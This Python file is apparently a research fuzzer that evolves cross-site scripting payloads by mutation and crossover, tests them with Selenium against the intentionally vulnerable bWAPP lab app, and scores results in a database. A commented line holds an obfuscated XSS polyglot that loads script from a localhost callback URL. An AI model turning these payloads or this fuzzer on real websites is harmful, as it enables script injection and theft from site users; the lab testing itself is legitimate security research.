import uuid
from typing import Callable
from bs4 import BeautifulSoup
from deepdiff import DeepDiff
from seleniumwire import webdriver
from payloads import *
import psycopg2
import cv2
import numpy as np
from multiprocessing import Pool
import sys

from bwapp_selenium_actions import *

'''
:return result: a dict of sets with positions, where a diff appeared either in @diff_payload or @diff_expected; empty if both are equal
'''
def compare_diffs(diff_payload: DeepDiff, diff_expected: DeepDiff):
    result = dict()
    for key in ['iterable_item_removed', 'iterable_item_added', 'values_changed']:
        if key in diff_payload:
            if key in diff_expected:
                set_expected = set(diff_expected[key].keys())
                set_actual = set(diff_payload[key].keys())
                result[key] = set_expected ^ set_actual
            else:
                result[key] = set(diff_payload[key].keys())
        elif key in diff_expected:
            result[key] = set(diff_expected[key].keys())
    return result

def rate_structure_diff(diff: dict) -> float:
    if "iterable_item_removed" in diff:
        if len(diff['iterable_item_removed']) != 0:
            return 0.1
    if "values_changed" in diff:
        if len(diff['values_changed']) != 0:
            return 0.5
    if "iterable_item_added" in diff:
        if len(diff['iterable_item_added']) != 0:
            return 0.8
    return 1

def compare_images(img_str1, img_str2):
    img1 = cv2.imread(img_str1)
    img2 = cv2.imread(img_str2)
    return np.sum((img1 - img2) ** 2) # calc medium squared error

def experiment_on_function(payloads: list[Payload], experiment_function: Callable[[webdriver, str, str], str]) -> any:
    # set login cookie for driver
    driver = webdriver.Chrome()
    driver.maximize_window()
    login(driver, BWAPP_URL)

    # test which differences appear when the payload changes between "normal" strings
    uuid_1 = str(uuid.uuid4())
    uuid_2 = str(uuid.uuid4())
    while uuid_1 == uuid_2: uuid_1 = str(uuid.uuid4())
    html_uuid_1 = experiment_function(driver, BWAPP_URL, uuid_1)
    driver.save_screenshot(f"tmp/expected-{experiment_function.__name__}-1.png")
    html_uuid_2 = experiment_function(driver, BWAPP_URL, uuid_2)
    driver.save_screenshot(f"tmp/expected-{experiment_function.__name__}-2.png")

    expected_response_code = None
    for req in reversed(driver.requests):
        if ".php" in req.path:
            expected_response_code = req.response.status_code
            break

    expected_img_diff = compare_images(f"tmp/expected-{experiment_function.__name__}-1.png", f"tmp/expected-{experiment_function.__name__}-2.png")

    soup_uuid_1 = BeautifulSoup(html_uuid_1, "html.parser")
    soup_uuid_2 = BeautifulSoup(html_uuid_2, "html.parser")

    expected_diff = DeepDiff(soup_uuid_1, soup_uuid_2)

    conn = psycopg2.connect(
        host=DB_HOST,
        port=DB_PORT,
        database=DB_NAME,
        user=DB_USER,
        password=DB_PASS
    )

    # generate diffs for each payload and compare to the expected diff, save differences
    for payload in payloads:
        payload_str = str(payload)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO xss_eval (payload, attacked_path) VALUES (%s, %s)",
                    (payload_str, experiment_function.__name__))
        conn.commit()
        cursor.execute("SELECT id, payload, attacked_path FROM xss_eval WHERE payload = %s AND attacked_path = %s ORDER BY id DESC", (payload_str, experiment_function.__name__))
        experiment_id = cursor.fetchone()[0]
        payload_str = payload_str.replace("<id>", str(experiment_id))

        html_payload = experiment_function(driver, BWAPP_URL, payload_str)
        soup_payload = BeautifulSoup(html_payload, "html.parser")
        diff_payload = DeepDiff(soup_uuid_1, soup_payload)
        structural_diff_to_expected = compare_diffs(diff_payload, expected_diff)
        structural_score = rate_structure_diff(structural_diff_to_expected)

        driver.save_screenshot(f"tmp/{experiment_function.__name__}-xss.png")
        img_diff = compare_images(f"tmp/expected-{experiment_function.__name__}-1.png", f"tmp/{experiment_function.__name__}-xss.png")

        img_score = 1
        if img_diff > IMAGE_DIFF_UPPER_THRESH * expected_img_diff:
            img_score = 0.1
        if img_diff > IMAGE_DIFF_LOWER_THRESH * expected_img_diff:
            img_score = 0.5

        js_score = 1
        console_out = driver.get_log("browser")
        if len(console_out) != 0:
            js_score = 0.8 # TODO improve metric

        response_code_score = 1
        for req in reversed(driver.requests):
            if ".php" in req.path:
                if expected_response_code != req.response.status_code:
                    response_code_score = 0.1
                break

        overall_score = structural_score * img_score * js_score * response_code_score

        cursor.execute("UPDATE xss_eval "
                       "SET structural_impact = %s, console_out = %s, structural_score = %s, img_score = %s, js_score = %s, "
                       "response_code_score = %s, overall_score = %s "
                       "WHERE id = %s",
                       (str(structural_diff_to_expected), str(console_out), structural_score, img_score, js_score, response_code_score,
                        overall_score, experiment_id)
                       )
        conn.commit()
    driver.quit()


def evaluate_results(payload_population):
    new_population = []
    conn = psycopg2.connect(
        host=DB_HOST,
        port=DB_PORT,
        database=DB_NAME,
        user=DB_USER,
        password=DB_PASS
    )
    cursor = conn.cursor()
    for payload in payload_population:
        cursor.execute("SELECT AVG(overall_score), COUNT(id) FROM xss_eval WHERE payload = %s", (str(payload),))
        avg_score, experiment_count = cursor.fetchone()
        cursor.execute("SELECT COUNT(id) FROM xss_eval WHERE payload = %s AND works = TRUE", (str(payload),))
        execution_count = cursor.fetchone()[0]
        effectivity = execution_count / experiment_count

        if effectivity > 0:
            new_population.append({"avg_score": avg_score, "effectivity": effectivity, "payload": payload})

    new_population.sort(key=lambda x: x["avg_score"], reverse=True)
    new_population.sort(key=lambda x: x["effectivity"], reverse=True)
    if VERBOSE:
        print("------- Best Payloads in Iteration ---------")
        print(new_population)
        print("----- END Best Payloads in Iteration -------")
    return new_population

def evolve_population(candidates: [Payload], population_size: int):
    new_gen = []
    for index, candidate in enumerate(candidates):
        mutation_count = MUTATION_RATE * SUCCESS_FACTOR if index < population_size * SUCCESS_THRESHOLD else MUTATION_RATE
        for _ in range(mutation_count):
            child = candidate["payload"].copy()
            child.mutate()
            new_gen.append(child)
    for index, parent1 in enumerate(candidates):
        child_count = REPRODUCTION_RATE * SUCCESS_FACTOR if index < population_size * SUCCESS_THRESHOLD else REPRODUCTION_RATE
        for parent2 in candidates:
            if parent1["payload"] != parent2["payload"]:
                for _ in range(child_count):
                    new_gen.append(cross_payloads(parent1["payload"], parent2["payload"]))
                    new_gen.append(cross_payloads(parent2["payload"], parent1["payload"]))
    for _ in range(population_size):
        new_gen.append(generate_payload())

    selection = random.sample(new_gen, population_size)
    return selection

def find_best_payload_in_db():
    conn = psycopg2.connect(
        host=DB_HOST,
        port=DB_PORT,
        database=DB_NAME,
        user=DB_USER,
        password=DB_PASS
    )
    cursor = conn.cursor()
    cursor.execute("SELECT payload, AVG(overall_score), COUNT(CASE WHEN works THEN 1 END) FROM (SELECT DISTINCT ON (payload, attacked_path) * FROM xss_eval) GROUP BY payload ORDER BY COUNT(CASE WHEN works THEN 1 END) DESC, AVG(overall_score) DESC")
    for payload in cursor.fetchall():
        if payload[2] == 0:
            break
        print(f"Execution count: {payload[2]}, Score: {payload[1]}, Payload: {payload[0]}")

def experiment_on_function_pool_wrapper(pair_payl_func):
    experiment_on_function(pair_payl_func[0], pair_payl_func[1])

def run(experiment_functions: [Callable[[webdriver, str, str], str]], population_size: int = 50, iterations: int = 10):
    payload_population = [Payload() for _ in range(population_size)]
    for _ in range(iterations):
        with Pool(MAX_PROCESS_COUNT) as p:
            p.map(experiment_on_function_pool_wrapper, [(payload_population.copy(), experiment_function) for experiment_function in experiment_functions])
        candidates = evaluate_results(payload_population)
        payload_population = evolve_population(candidates, population_size)
    find_best_payload_in_db()

# payloads = ["\"<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt>nOeMbed><ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>\"&gt;import(`http://localhost:5000/submit/<id>`) <!--hTmL>' oNLoAd= )texTarEa&gt;<iMg-<ScRiPt sRc=`http://localhost:5000/submit/<id>`></ScRiPt> oNFoCus=*/';/ifRaMe>hTmL> oNtOgGle=/*`>/sOurCe&gt; oNmOuSeLeaVe= > OnBlUr= <ScRiPt sRc='http://localhost:5000/submit/<id>'></ScRiPt>iMg/* onClICk=import(\"http://localhost:5000/submit/<id>\")", "sane"]
EXPERIMENT_FUNCTIONS = [xss_reflected_eval, xss_reflected_get_firstname] # TODO add all

if __name__ == '__main__':
    if len(sys.argv) > 1:
        if len(sys.argv) < 3 or not (sys.argv[1].isnumeric() and sys.argv[2].isnumeric()):
            print("USAGE: python3 experiment.py [population_size] [iterations]")
            print("DEFAULT: population_size = 10, iterations = 3")
        else:
            run(EXPERIMENT_FUNCTIONS, int(sys.argv[1]), int(sys.argv[2]))
    run(EXPERIMENT_FUNCTIONS, 10, 3)
